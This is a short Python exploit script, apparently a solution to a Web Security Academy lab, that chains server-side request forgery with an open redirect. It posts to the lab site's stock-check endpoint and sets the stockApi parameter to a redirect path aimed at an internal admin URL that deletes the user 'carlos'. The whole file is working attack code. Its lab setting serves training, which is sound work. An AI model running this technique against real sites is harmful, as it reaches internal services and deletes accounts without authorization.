import requests

# Replace with your actual lab domain
site = "0aa100e0046444f78217104000660072.web-security-academy.net"
stock_url = f"https://{site}/product/stock"

# Internal admin deletion URL
internal_admin_url = "http://192.168.0.12:8080/admin/delete?username=carlos"

# Construct the open redirect URL using known redirector path and param
open_redirect_path = f"/product/nextProduct?path={internal_admin_url}"

# Final payload
stock_api_data = {
    "stockApi": open_redirect_path
}

# Execute the POST request
resp = requests.post(stock_url, data=stock_api_data)
print("[✓] Response:\n", resp.text)